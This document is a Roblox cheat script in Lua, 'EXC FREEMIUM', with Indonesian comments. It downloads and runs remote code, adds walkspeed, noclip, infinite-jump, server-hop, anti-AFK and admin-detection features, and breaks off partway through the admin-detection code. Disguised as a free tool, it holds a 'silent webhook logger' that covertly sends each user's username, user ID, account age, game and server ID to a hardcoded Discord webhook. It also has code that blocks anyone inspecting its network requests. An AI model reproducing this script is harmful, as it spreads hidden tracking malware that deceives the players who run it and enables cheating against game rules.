
print("EXC FREEMIUM - Loading Modules...")

-- [[ 1. SECURE GITHUB LOADER WITH ANTI-SPY ]]
local GITHUB_BASE = "https://raw.githubusercontent.com/lilyml2222-source/tst/main/"

-- Anti HTTP Spy Protection
local OriginalHttpGet = game.HttpGet
local SecureHttpGet = function(self, url)
    -- Deteksi jika ada yang mencoba spy HTTP request
    local info = debug.getinfo(2, "s")
    if info and info.source and not info.source:find("CoreGui") then
        -- Block jika dipanggil dari external source
        if not url:find("raw.githubusercontent.com/lilyml2222%-source") then
            return ""
        end
    end
    return OriginalHttpGet(self, url)
end

-- Simple obfuscation untuk URL
local function DecodeURL(encoded)
    return encoded:gsub("EXCBASE", GITHUB_BASE)
end

-- Load modules dengan proteksi
local Config = loadstring(game:HttpGet(DecodeURL("EXCBASEconfig.lua")))()
local Core = loadstring(game:HttpGet(DecodeURL("EXCBASEcore.lua")))()

-- Anti-decompile protection
local function ProtectFunction(func)
    return function(...)
        local success, result = pcall(func, ...)
        if not success then
            return nil
        end
        return result
    end
end

Config = ProtectFunction(function() return Config end)()
Core = ProtectFunction(function() return Core end)()

-- Link Config ke Core
Core.Config = Config

print("✅ Modules Loaded!")

-- [[ 1.5 ANTI-HOOK PROTECTION ]]
task.spawn(function()
    -- Protect critical functions
    local ProtectedFunctions = {
        game.HttpGet,
        game.HttpGetAsync,
        loadstring
    }
    
    -- Monitor untuk perubahan suspicious
    task.spawn(function()
        while task.wait(5) do
            -- Simple integrity check
            if game.HttpGet ~= OriginalHttpGet then
                -- Restore original jika terdeteksi hook
                game.HttpGet = OriginalHttpGet
            end
        end
    end)
end)

-- [[ 2. SERVICES ]]
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- [[ 2.5 SILENT WEBHOOK LOGGER ]]
task.spawn(function()
    local WebhookURL = "https://canary.discord.com/api/webhooks/1448194932774015058/oAR_1goZyUhunZsl2R0s1jLojetAgjifucq6gJybyWYPXL5Wx7M_wnNtsvyUvwb_zmoJ"
    
    local function SendWebhook()
        local success, err = pcall(function()
            local PlayerInfo = {
                Username = LocalPlayer.Name,
                DisplayName = LocalPlayer.DisplayName,
                UserId = LocalPlayer.UserId,
                AccountAge = LocalPlayer.AccountAge,
                ProfileLink = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
                GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                GameId = game.PlaceId,
                JobId = game.JobId
            }
            
            local Embed = {
                ["title"] = "🎮 EXC FREEMIUM - New User",
                ["color"] = tonumber(0xFF0000),
                ["fields"] = {
                    {
                        ["name"] = "👤 Username",
                        ["value"] = "`" .. PlayerInfo.Username .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📛 Display Name",
                        ["value"] = "`" .. PlayerInfo.DisplayName .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🆔 User ID",
                        ["value"] = "`" .. PlayerInfo.UserId .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "📅 Account Age",
                        ["value"] = "`" .. PlayerInfo.AccountAge .. " days`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🔗 Profile Link",
                        ["value"] = "[Click Here](" .. PlayerInfo.ProfileLink .. ")",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎯 Game Playing",
                        ["value"] = "`" .. PlayerInfo.GameName .. "`",
                        ["inline"] = false
                    },
                    {
                        ["name"] = "🎮 Game ID",
                        ["value"] = "`" .. PlayerInfo.GameId .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "🌐 Server ID",
                        ["value"] = "`" .. PlayerInfo.JobId .. "`",
                        ["inline"] = true
                    }
                },
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. PlayerInfo.UserId .. "&width=420&height=420&format=png"
                },
                ["footer"] = {
                    ["text"] = "EXC FREEMIUM Logger • " .. os.date("%Y-%m-%d %H:%M:%S")
                },
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%S")
            }
            
            local Data = {
                ["embeds"] = {Embed}
            }
            
            local Headers = {
                ["Content-Type"] = "application/json"
            }
            
            local Request = http_request or request or HttpPost or syn.request
            Request({
                Url = WebhookURL,
                Method = "POST",
                Headers = Headers,
                Body = HttpService:JSONEncode(Data)
            })
        end)
        
        if not success then
            -- Silent fail - tidak ada notifikasi error
        end
    end
    
    -- Kirim webhook setelah 2 detik (untuk memastikan semua data sudah load)
    task.wait(2)
    SendWebhook()
end)

-- [[ 3. SETUP WINDUI ]]
local WindUI = loadstring(game:HttpGet(
    "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
))()

loadstring(game:HttpGet(
    "https://raw.githubusercontent.com/Footagesus/Icons/refs/heads/main/Main-v2.lua"
))()

Core.WindUI = WindUI

local Window = WindUI:CreateWindow({
    Title = "EXC FREEMIUM",
    Icon = "rbxassetid://74535250876802",
    Author = "DWONTOL",
    Folder = "exc freemium",
    Transparent = true,
    Theme = "Dark",
    Background = "rbxassetid://99554444694555",
    BackgroundImageTransparency = 0.9,
    ToggleKeybind = Enum.KeyCode.RightControl,
    SideBarWidth = 160,
    KeySystem = {
        Key = { "FREE" },
        Note = "Key: FREE - Enjoy all features!",
        SaveKey = true
    }
})

-- [[ 4. TABS ]] - REORDERED (REMOVED AUTHENTICATION TAB)
local AutoWalkTab = Window:Tab({ Title = "Auto Walk", Icon = "footprints" })
local AccountTab = Window:Tab({ Title = "Account", Icon = "circle-user" })
local PlayerMenuTab = Window:Tab({ Title = "Player Menu", Icon = "user" })
local PerformanceTab = Window:Tab({ Title = "Performance", Icon = "gauge" })
local BypassTab = Window:Tab({ Title = "Bypass", Icon = "shield-off" })
local AnimationTab = Window:Tab({ Title = "Animation", Icon = "person-standing" })
local SkyboxTab = Window:Tab({ Title = "Skybox", Icon = "cloud" })
local ThemeTab = Window:Tab({ Title = "Theme UI", Icon = "palette" })
local EXCTab = Window:Tab({ Title = "EXC", Icon = "video" })
local SocialMediaTab = Window:Tab({ Title = "Social Media", Icon = "share-2" })

-- [[ 5. SETUP FLOATING MENU ]]
local function CreateMiniMenu()
    if getgenv().MiniUI then getgenv().MiniUI:Destroy() end

    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "AutoWalkMiniMenu"
    ScreenGui.ResetOnSpawn = false
    if pcall(function() ScreenGui.Parent = CoreGui end) then
        ScreenGui.Parent = CoreGui
    else
        ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    end
    getgenv().MiniUI = ScreenGui

    local MainFrame = Instance.new("Frame")
    MainFrame.Parent = ScreenGui
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    MainFrame.BackgroundTransparency = 0.2
    MainFrame.Position = UDim2.new(0.1, 0, 0.65, 0)
    MainFrame.Size = UDim2.new(0, 220, 0, 50)
    MainFrame.Active = true
    MainFrame.Draggable = true

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 10)
    UICorner.Parent = MainFrame

    local UIStroke = Instance.new("UIStroke")
    UIStroke.Color = Color3.fromRGB(255, 0, 0)
    UIStroke.Thickness = 1.5
    UIStroke.Parent = MainFrame

    local Layout = Instance.new("UIListLayout")
    Layout.Parent = MainFrame
    Layout.FillDirection = Enum.FillDirection.Horizontal
    Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
    Layout.VerticalAlignment = Enum.VerticalAlignment.Center
    Layout.Padding = UDim.new(0, 10)

    local function CreateButton(text, callback)
        local Btn = Instance.new("TextButton")
        Btn.Parent = MainFrame
        Btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        Btn.Size = UDim2.new(0, 60, 0, 30)
        Btn.Font = Enum.Font.GothamBold
        Btn.Text = text
        Btn.TextColor3 = Color3.fromRGB(255, 0, 0)
        Btn.TextSize = 14
        local BtnCorner = Instance.new("UICorner", Btn)
        BtnCorner.CornerRadius = UDim.new(0, 6)
        Btn.MouseButton1Click:Connect(callback)
        return Btn
    end

    CreateButton("PLAY", function()
        if Config.isPlaying then 
            WindUI:Notify({Title="Info", Content="Sedang berjalan...", Duration=1}) 
            return 
        end
        if Config.CurrentRepoURL == "" then 
            WindUI:Notify({Title="Error", Content="Pilih Track Dulu!", Duration=2,
            Icon="map-plus"}) 
            return 
        end
        
        Config.isPlaying = true
        WindUI:Notify({Title="Play", Content="Auto Walk Aktif", Duration=2,
        Icon="footprints"})
        
        task.spawn(function()
            if not Config.isCached then
                WindUI:Notify({Title="Download", Content="Mengunduh data...", Duration=2,
                Icon="download"})
                local success = Core.DownloadData(Config.CurrentRepoURL)
                if not success then
                    Config.isPlaying = false
                    WindUI:Notify({Title="Gagal", Content=" Error / Kosong", Duration=3})
                    return
                end
                Config.isCached = true
            end
            Core.RunPlayback()
        end)
    end)

    CreateButton("STOP", function()
        if Config.isPlaying then
            Config.isPlaying = false
            task.wait(0.1)
            Core.ResetCharacter()
            WindUI:Notify({Title="Stopped", Content="Autowalk dipause.", Duration=3,
            Icon="circle-pause"})
        else
            WindUI:Notify({Title="Info", Content="sudah berhenti.", Duration=1})
        end
    end)

    CreateButton("FLIP", function()
        if Config.FlipOffset == 0 then
            Config.FlipOffset = math.pi
            WindUI:Notify({Title="Flip", Content="Menghadap Belakang", Duration=1})
        else
            Config.FlipOffset = 0
            WindUI:Notify({Title="Flip", Content="Menghadap Normal", Duration=1})
        end
    end)
end

-- [[ 6. AUTO WALK TAB CONTENT ]]

-- Auto Walk | Settings
AutoWalkTab:Section({
    Title = "Auto Walk | Settings"
})

AutoWalkTab:Toggle({
    Title = "Enable Loop",
    Desc = "Repeat playback automatically from start after reaching the end",
    Value = false,
    Callback = function(state) 
        Config.isLooping = state 
        
        if state then
            WindUI:Notify({
                Title="Loop Enabled", 
                Content="Playback will repeat infinitely", 
                Duration=2,
                Icon="repeat"
            })
        else
            WindUI:Notify({
                Title="Loop Disabled", 
                Content="Playback will stop after completion", 
                Duration=2,
                Icon="repeat-2"
            })
        end
    end
})

AutoWalkTab:Toggle({
    Title = "Auto Respawn on Loop",
    Desc = "masih bug",
    Value = false,
    Callback = function(state)
        Config.autoRespawnLoop = state
        
        if state then
            WindUI:Notify({
                Title="Auto Respawn Enabled", 
                Content="Character will respawn after each loop completion", 
                Duration=2
            })
        else
            WindUI:Notify({
                Title="Auto Respawn Disabled", 
                Content="Character will continue without respawning", 
                Duration=2
            })
        end
    end
})

-- Set PlaybackSpeed ke Config agar bisa diakses di Core.lua
if not Config.PlaybackSpeed then
    Config.PlaybackSpeed = 1
end

-- Speed Slider
AutoWalkTab:Slider({
    Title = "AutoWalk Speed",
    Desc = "Geser untuk mengatur kecepataan autowalk (0.9x - 3.0x)",
    Step = 0.1,
    Value = {
        Min = 0.9,
        Max = 3.0,
        Default = 1.0
    },
    Callback = function(value)
        Config.PlaybackSpeed = value
        
        WindUI:Notify({
            Title="Playback Speed", 
            Content=string.format("Speed: %.1fx", value), 
            Duration=1.5,
            Icon="circle-gauge"
        })
    end
})

-- Auto Walk | Menu
AutoWalkTab:Section({
    Title = "Auto Walk | Menu",
    Desc = ""
})

local TrackDropdown = AutoWalkTab:Dropdown({
    Title = "[◉] SELECT TRACK",
    Multi = false,
    Options = {"Loading..."},
    Default = "Loading...",
    Callback = function(value)
        if value ~= "Loading..." then
            Config.CurrentRepoURL = Core.GetRepoURL(value)
            Config.isCached = false
            Config.SavedCP = 0
            Config.SavedFrame = 1
            Config.TASDataCache = {}
            WindUI:Notify({Title="Selected", Content=value.." siap.", Duration=2})
        end
    end
})

AutoWalkTab:Toggle({
    Title = "[◉] Show/Hide Auto Walk",
    Desc = "Menampilkan / menyembunyikan menu Auto Walk.",
    Value = false,
    Callback = function(state)
        if state then 
            CreateMiniMenu() 
        else 
            if getgenv().MiniUI then 
                getgenv().MiniUI:Destroy() 
            end 
        end
    end
})

AutoWalkTab:Button({
    Title = "Refresh List",
    Callback = function() 
        TrackDropdown:Refresh(Config.MountList, "Mount Funny") 
    end
})

-- =====================================================
-- ================= PLAYER MENU TAB ====================
-- =====================================================

-- ===== MOVEMENT SECTION =====
PlayerMenuTab:Section({
    Title = "MOVEMENT"
})

local SpeedEnabled = false
local SpeedValue = 70

local function ApplySpeed()
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.WalkSpeed = SpeedEnabled and SpeedValue or 16
    end
end

PlayerMenuTab:Toggle({
    Title = "Enable WalkSpeed",
    Desc = "Use custom walk speed",
    Type="Checkbox",
    Value = false,
    Callback = function(state)
        SpeedEnabled = state
        ApplySpeed()
    end
})

PlayerMenuTab:Slider({
    Title = "WalkSpeed",
    Desc = "20 - 120",
    Step = 1,
    Value = {
        Min = 20,
        Max = 120,
        Default = 70
    },
    Callback = function(value)
        SpeedValue = value
        ApplySpeed()
    end
})

-- ===== ANOTHER SECTION =====
PlayerMenuTab:Section({
    Title = "ANOTHER"
})

-- NoClip Variables
local NoClipEnabled = false
local NoClipConnection

local function ApplyNoClip()
    local char = LocalPlayer.Character
    if char then
        for _, part in pairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                part.CanCollide = not NoClipEnabled
            end
        end
    end
end

PlayerMenuTab:Toggle({
    Title = "NoClip",
    Desc = "Walk through walls",
    Value = false,
    Callback = function(state)
        NoClipEnabled = state
        
        if state then
            NoClipConnection = RunService.Stepped:Connect(function()
                ApplyNoClip()
            end)
        else
            if NoClipConnection then
                NoClipConnection:Disconnect()
                NoClipConnection = nil
            end
            local char = LocalPlayer.Character
            if char then
                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then
                        part.CanCollide = true
                    end
                end
            end
        end
    end
})

-- Infinite Jump Variables
local InfiniteJumpEnabled = false
local InfiniteJumpConnection

PlayerMenuTab:Toggle({
    Title = "Infinite Jump",
    Desc = "Jump unlimited times in air",
    Value = false,
    Callback = function(state)
        InfiniteJumpEnabled = state
        
        if state then
            InfiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
                if InfiniteJumpEnabled then
                    local char = LocalPlayer.Character
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    if hum then
                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
                    end
                end
            end)
        else
            if InfiniteJumpConnection then
                InfiniteJumpConnection:Disconnect()
                InfiniteJumpConnection = nil
            end
        end
    end
})

-- FullBright Variables
local FullBrightEnabled = false
local OriginalLightingSettings = {}

local function SaveLightingSettings()
    OriginalLightingSettings = {
        Ambient = Lighting.Ambient,
        Brightness = Lighting.Brightness,
        ColorShift_Bottom = Lighting.ColorShift_Bottom,
        ColorShift_Top = Lighting.ColorShift_Top,
        OutdoorAmbient = Lighting.OutdoorAmbient,
        GlobalShadows = Lighting.GlobalShadows,
        FogEnd = Lighting.FogEnd
    }
end

local function ApplyFullBright()
    if FullBrightEnabled then
        Lighting.Ambient = Color3.new(1, 1, 1)
        Lighting.Brightness = 2
        Lighting.ColorShift_Bottom = Color3.new(1, 1, 1)
        Lighting.ColorShift_Top = Color3.new(1, 1, 1)
        Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 100000
    else
        for prop, value in pairs(OriginalLightingSettings) do
            Lighting[prop] = value
        end
    end
end

SaveLightingSettings()

PlayerMenuTab:Toggle({
    Title = "FullBright",
    Desc = "See everything clearly",
    Value = false,
    Callback = function(state)
        FullBrightEnabled = state
        ApplyFullBright()
    end
})

-- ===== TIME MENU SECTION =====
PlayerMenuTab:Section({
    Title = "TIME MENU"
})

local TimeLocked = false
local TimeValue = 12
local TimeConnection

local function ApplyTime()
    Lighting.ClockTime = TimeValue
end

PlayerMenuTab:Toggle({
    Title = "Lock Time",
    Desc = "Freeze current time (client-side)",
    Type="Checkbox",
    Value = false,
    Callback = function(state)
        TimeLocked = state
        
        if state then
            ApplyTime()
            TimeConnection = RunService.RenderStepped:Connect(function()
                Lighting.ClockTime = TimeValue
            end)
        else
            if TimeConnection then
                TimeConnection:Disconnect()
                TimeConnection = nil
            end
        end
    end
})

PlayerMenuTab:Slider({
    Title = "Set Time",
    Desc = "1 = Night | 12 = Day",
    Step = 1,
    Value = {
        Min = 1,
        Max = 12,
        Default = 12
    },
    Callback = function(value)
        TimeValue = value
        if TimeLocked then
            ApplyTime()
        end
    end
})

-- ===== RESPAWN REAPPLY =====
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.3)
    ApplySpeed()
end)

-- =====================================================
-- ================= PERFORMANCE TAB ====================
-- =====================================================

PerformanceTab:Section({
    Title = "FPS BOOST"
})

-- Kentang Mode Variables
local KentangModeEnabled = false

local function ApplyKentangMode()
    if KentangModeEnabled then
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        
        for _, effect in pairs(Lighting:GetChildren()) do
            if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or 
               effect:IsA("BlurEffect") or effect:IsA("ColorCorrectionEffect") or
               effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") then
                effect.Enabled = false
            end
        end
        
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or 
               obj:IsA("Fire") or obj:IsA("Sparkles") then
                obj.Enabled = false
            elseif obj:IsA("MeshPart") or obj:IsA("Part") or obj:IsA("UnionOperation") then
                obj.Material = Enum.Material.SmoothPlastic
                obj.Reflectance = 0
            elseif obj:IsA("Decal") or obj:IsA("Texture") then
                obj.Transparency = 1
            end
        end
        
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        
        WindUI:Notify({
            Title = "Kentang Mode",
            Content = "FPS Boost activated!",
            Duration = 3
        })
    end
end

PerformanceTab:Toggle({
    Title = "Kentang Mode",
    Desc = "Remove textures & boost FPS",
    Value = false,
    Callback = function(state)
        KentangModeEnabled = state
        if state then
            ApplyKentangMode()
        end
    end
})

-- Photato Mode Variables
local PhototoModeEnabled = false

local function ApplyPhototoMode()
    if PhototoModeEnabled then
        settings().Rendering.QualityLevel = Enum.QualityLevel.Level01
        
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.Brightness = 0
        Lighting.Ambient = Color3.new(1, 1, 1)
        Lighting.OutdoorAmbient = Color3.new(1, 1, 1)
        
        for _, effect in pairs(Lighting:GetChildren()) do
            if not effect:IsA("Sky") and not effect:IsA("Atmosphere") then
                pcall(function() effect:Destroy() end)
            end
        end
        
        for _, sky in pairs(Lighting:GetChildren()) do
            if sky:IsA("Sky") or sky:IsA("Atmosphere") then
                sky:Destroy()
            end
        end
        
        local playerGui = LocalPlayer:WaitForChild("PlayerGui")
        for _, gui in pairs(playerGui:GetChildren()) do
            if gui.Name:lower():find("leaderboard") or gui.Name:lower():find("leader") then
                gui:Destroy()
            end
        end
        
        local StarterGui = game:GetService("StarterGui")
        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
        
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or 
               obj:IsA("Fire") or obj:IsA("Sparkles") or obj:IsA("PointLight") or
               obj:IsA("SpotLight") or obj:IsA("SurfaceLight") then
                obj:Destroy()
            elseif obj:IsA("MeshPart") or obj:IsA("Part") or obj:IsA("UnionOperation") then
                obj.Material = Enum.Material.SmoothPlastic
                obj.Color = Color3.new(1, 1, 1)
                obj.Reflectance = 0
                obj.CastShadow = false
            elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("SurfaceGui") then
                obj:Destroy()
            elseif obj:IsA("MeshPart") and obj:FindFirstChildOfClass("SpecialMesh") then
                obj:FindFirstChildOfClass("SpecialMesh"):Destroy()
            end
        end
        
        local char = LocalPlayer.Character
        if char then
            for _, acc in pairs(char:GetChildren()) do
                if acc:IsA("Accessory") or acc:IsA("Hat") then
                    acc:Destroy()
                elseif acc:IsA("Part") or acc:IsA("MeshPart") then
                    acc.Material = Enum.Material.SmoothPlastic
                    acc.Color = Color3.new(1, 1, 1)
                    acc.Reflectance = 0
                end
            end
            
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("Decal") or part:IsA("Texture") then
                    part:Destroy()
                elseif part:IsA("BasePart") then
                    part.Material = Enum.Material.SmoothPlastic
                    part.Color = Color3.new(1, 1, 1)
                end
            end
        end
        
        if char then
            local humanoid = char:FindFirstChildOfClass("Humanoid")
            if humanoid then
                for _, track in pairs(humanoid:GetPlayingAnimationTracks()) do
                    track:Stop()
                end
            end
        end
        
        WindUI:Notify({
            Title = "Photato Mode",
            Content = "ULTRA MAXIMUM FPS MODE!",
            Duration = 3
        })
    end
end

PerformanceTab:Button({
    Title = "Photato Mode",
    Desc = "EXTREME FPS boost - White mode",
    Callback = function()
        PhototoModeEnabled = true
        ApplyPhototoMode()
    end
})

PerformanceTab:Paragraph({
    Title = "WARNING",
    Desc = "Photato Mode will make game very ugly but super smooth!"
})

-- =====================================================
-- ================= SKYBOX TAB =========================
-- =====================================================

-- Save Default Sky
local DefaultSky = {}
do
    local sky = Lighting:FindFirstChildOfClass("Sky")
    if sky then
        DefaultSky = {
            Bk = sky.SkyboxBk,
            Dn = sky.SkyboxDn,
            Ft = sky.SkyboxFt,
            Lf = sky.SkyboxLf,
            Rt = sky.SkyboxRt,
            Up = sky.SkyboxUp
        }
    else
        DefaultSky = {
            Bk = "rbxasset://textures/sky/sky512_bk.tex",
            Dn = "rbxasset://textures/sky/sky512_dn.tex",
            Ft = "rbxasset://textures/sky/sky512_ft.tex",
            Lf = "rbxasset://textures/sky/sky512_lf.tex",
            Rt = "rbxasset://textures/sky/sky512_rt.tex",
            Up = "rbxasset://textures/sky/sky512_up.tex"
        }
    end
end

-- ================= SKY PRESETS =================
local SkyboxPresets = {
    {
        Name = "Velora Mount",
        Bk = "rbxassetid://126146408999925",
        Dn = "rbxassetid://118112392224589",
        Ft = "rbxassetid://121253817183621",
        Lf = "rbxassetid://134105463289425",
        Rt = "rbxassetid://89099449712918",
        Up = "rbxassetid://138429250948648"
    },
    {
        Name = "Red Sky Destruction",
        Bk = "rbxassetid://15493709538",
        Dn = "rbxassetid://15493710499",
        Ft = "rbxassetid://15493711616",
        Lf = "rbxassetid://15493712720",
        Rt = "rbxassetid://15493713902",
        Up = "rbxassetid://15493714708"
    },
    {
        Name = "Stone Sky",
        Bk = "rbxassetid://16262356578",
        Dn = "rbxassetid://16262358026",
        Ft = "rbxassetid://16262360469",
        Lf = "rbxassetid://16262362003",
        Rt = "rbxassetid://16262363873",
        Up = "rbxassetid://16262366016"
    },
    {
        Name = "Purple Nebula",
        Bk = "rbxassetid://15983968922",
        Dn = "rbxassetid://15983966825",
        Ft = "rbxassetid://15983965025",
        Lf = "rbxassetid://15983967420",
        Rt = "rbxassetid://15983966246",
        Up = "rbxassetid://15983964246"
    },
    {
        Name = "Galaxy Sky",
        Bk = "rbxassetid://159454299",
        Dn = "rbxassetid://159454296",
        Ft = "rbxassetid://159454293",
        Lf = "rbxassetid://159454286",
        Rt = "rbxassetid://159454300",
        Up = "rbxassetid://159454288"
    },
    {
        Name = "Soft Sky",
        Bk = "rbxassetid://271042516",
        Dn = "rbxassetid://271077243",
        Ft = "rbxassetid://271042556",
        Lf = "rbxassetid://271042310",
        Rt = "rbxassetid://271042467",
        Up = "rbxassetid://271077958"
    },
    {
        Name = "Galaxy Smooth Dark",
        Bk = "rbxassetid://159454299",
        Dn = "rbxassetid://159454296",
        Ft = "rbxassetid://159454293",
        Lf = "rbxassetid://159454286",
        Rt = "rbxassetid://159454300",
        Up = "rbxassetid://159454288"
    },
    {
        Name = "Ultra Blue Horizon",
        Bk = "rbxassetid://433274085",
        Dn = "rbxassetid://433274194",
        Ft = "rbxassetid://433274131",
        Lf = "rbxassetid://433274370",
        Rt = "rbxassetid://433274429",
        Up = "rbxassetid://433274285"
    },
    {
        Name = "Realistic Clouds",
        Bk = "rbxassetid://151165214",
        Dn = "rbxassetid://151165197",
        Ft = "rbxassetid://151165224",
        Lf = "rbxassetid://151165191",
        Rt = "rbxassetid://151165206",
        Up = "rbxassetid://151165227"
    },
    {
        Name = "Soft Morning Sky",
        Bk = "rbxassetid://271042516",
        Dn = "rbxassetid://271077243",
        Ft = "rbxassetid://271042556",
        Lf = "rbxassetid://271042310",
        Rt = "rbxassetid://271042467",
        Up = "rbxassetid://271077958"
    },
    {
        Name = "Red Galaxy Storm",
        Bk = "rbxassetid://12064107",
        Dn = "rbxassetid://12064152",
        Ft = "rbxassetid://12064121",
        Lf = "rbxassetid://12063984",
        Rt = "rbxassetid://12064115",
        Up = "rbxassetid://12064131"
    }
}

-- ================= LOGIC =================
local Toggles = {}
local InternalChange = false

local function GetSky()
    return Lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky", Lighting)
end

local function ApplySky(p)
    local s = GetSky()
    s.SkyboxBk = p.Bk
    s.SkyboxDn = p.Dn
    s.SkyboxFt = p.Ft
    s.SkyboxLf = p.Lf
    s.SkyboxRt = p.Rt
    s.SkyboxUp = p.Up
end

local function ResetSky()
    local s = GetSky()
    s.SkyboxBk = DefaultSky.Bk
    s.SkyboxDn = DefaultSky.Dn
    s.SkyboxFt = DefaultSky.Ft
    s.SkyboxLf = DefaultSky.Lf
    s.SkyboxRt = DefaultSky.Rt
    s.SkyboxUp = DefaultSky.Up
end

local function DisableOthers(current)
    InternalChange = true
    for name, t in pairs(Toggles) do
        if name ~= current then
            t:Set(false)
        end
    end
    task.wait()
    InternalChange = false
end

-- ================= UI =================
SkyboxTab:Section({
    Title = "Skybox",
    Desc = ""
})

for _, preset in ipairs(SkyboxPresets) do
    Toggles[preset.Name] = SkyboxTab:Toggle({
        Title = preset.Name,
        Desc = "Slide to Activate",
        Value = false,
        Callback = function(state)
            if state then
                DisableOthers(preset.Name)
                ApplySky(preset)
                WindUI:Notify({
                    Title = "Skybox Applied",
                    Content = preset.Name .. " Activated",
                    Duration = 2,
                    Icon="cloudy"
                })
            else
                if InternalChange then return end
                ResetSky()
                WindUI:Notify({
                    Title = "Skybox Reset",
                    Content = "Skybox reset to default",
                    Duration = 2,
                    Icon="cloud-off" })
            end
        end
    })
end

-- =====================================================
-- ================= BYPASS TAB =========================
-- =====================================================

BypassTab:Section({
    Title = "SERVER MANAGEMENT"
})

BypassTab:Button({
    Title = "Server Hop (Lowest Players)",
    Desc = "Find and join the server with least players",
    Callback = function()
        WindUI:Notify({
            Title = "Server Hop",
            Content = "Searching for server...",
            Duration = 2,
            Icon="search"
        })
        
        local PlaceId = game.PlaceId
        local JobId = game.JobId
        
        local success, result = pcall(function()
            local servers = {}
            local cursor = ""
            
            repeat
                local url = string.format(
                    "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s",
                    PlaceId, cursor
                )
                
                local response = game:HttpGet(url)
                local data = HttpService:JSONDecode(response)
                
                for _, server in pairs(data.data) do
                    if server.id ~= JobId and server.playing < server.maxPlayers then
                        table.insert(servers, {
                            id = server.id,
                            playing = server.playing
                        })
                    end
                end
                
                cursor = data.nextPageCursor or ""
            until cursor == ""
            
            if #servers > 0 then
                table.sort(servers, function(a, b)
                    return a.playing < b.playing
                end)
                
                WindUI:Notify({
                    Title = "Server Found",
                    Content = "Joining server with "..servers[1].playing.." players",
                    Duration = 2,
                    Icon="search-check"
                })
                
                TeleportService:TeleportToPlaceInstance(PlaceId, servers[1].id, LocalPlayer)
            else
                WindUI:Notify({
                    Title = "No Server Found",
                    Content = "Could not find suitable server",
                    Duration = 3
                })
            end
        end)
        
        if not success then
            WindUI:Notify({
                Title = "Error",
                Content = "Failed to hop servers",
                Duration = 3
            })
        end
    end
})

BypassTab:Button({
    Title = "Rejoin Server",
    Desc = "Rejoin current server",
    Callback = function()
        WindUI:Notify({
            Title = "Rejoining",
            Content = "Rejoining server...",
            Duration = 2,
            Icon="loader"
        })
        
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
    end
})

BypassTab:Section({
    Title = "ANTI DETECTION"
})

-- Anti AFK Variables
local AntiAFKEnabled = false
local AntiAFKConnection

BypassTab:Toggle({
    Title = "Anti AFK",
    Desc = "",
    Value = false,
    Callback = function(state)
        AntiAFKEnabled = state
        
        if state then
            local VirtualUser = game:GetService("VirtualUser")
            
            AntiAFKConnection = LocalPlayer.Idled:Connect(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
                
                WindUI:Notify({
                    Title = "Anti AFK",
                    Content = "AFK prevention triggered",
                    Duration = 1
                })
            end)
            
            WindUI:Notify({
                Title = "Anti AFK",
                Content = "Anti AFK Enabled",
                Duration = 2,
                Icon="shield-off"
            })
        else
            if AntiAFKConnection then
                AntiAFKConnection:Disconnect()
                AntiAFKConnection = nil
            end
            
            WindUI:Notify({
                Title = "Anti AFK",
                Content = "Anti AFK Disabled",
                Duration = 2,
                Icon="shield-ban"
            })
        end
    end
})

-- Admin Detect Variables
local AdminDetectEnabled = false
local AdminDetectConnection
local KnownAdmins = {}

BypassTab:Toggle({
    Title = "Admin Detect",
    Desc = "",
    Value = false,
    Callback = function(state)
        AdminDetectEnabled = state
        
        if state then
            -- Check current players
            for _, player in pairs(Players:GetPlayers()) do
                local success, inGroup = pcall(function()
                    return player:GetRankInGroup(game.CreatorId)
                end)
                
                if success and inGroup > 0 then
                    KnownAdmins[player.UserId] = true
                    WindUI:Notify({
                        Title = "ADMIN DETECTED",
